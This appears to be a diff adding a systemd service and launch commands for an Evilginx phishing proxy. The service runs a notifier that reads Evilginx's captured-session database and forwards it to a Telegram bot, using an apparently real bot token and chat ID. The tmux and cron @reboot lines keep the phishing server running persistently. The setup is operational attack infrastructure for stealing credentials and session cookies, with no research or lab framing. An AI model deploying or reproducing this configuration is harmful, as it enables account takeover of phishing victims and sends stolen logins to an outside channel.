@@ -1,0 +1,25 @@
+[Unit]
+Description=Evilginx Telegram notifier
+After=evilginx.service
+
+[Service]
+Type=simple
+Environment=TG_BOT_TOKEN=8870018485:AAE4SG-Uy5eW5pqroyW50_fBr8PimIO7N0o
+Environment=TG_CHAT_ID=5123288602
+ExecStart=/usr/bin/python3 /root/evilginx/telegram_notify.py --db /root/.evilginx/data.db --state /root/.evilginx/telegram_state.json --interval 5
+Restart=on-failure
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+
+/root/evilginx/build/evilginx -developer -debug -p /root/evilginx/phishlets -c /root/.evilginx
+
+
+tmux new -d -s evilginx '/root/evilginx/build/evilginx -developer -debug -p /root/evilginx/phishlets -c /root/.evilginx'
+
+
+@reboot tmux new -d -s evilginx '/root/evilginx/build/evilginx -developer -debug -p /root/evilginx/phishlets -c /root/.evilginx'
+
+
+tmux new -d -s evilginx '/root/evilginx/build/evilginx -debug -p /root/evilginx/phishlets -c /root/.evilginx'
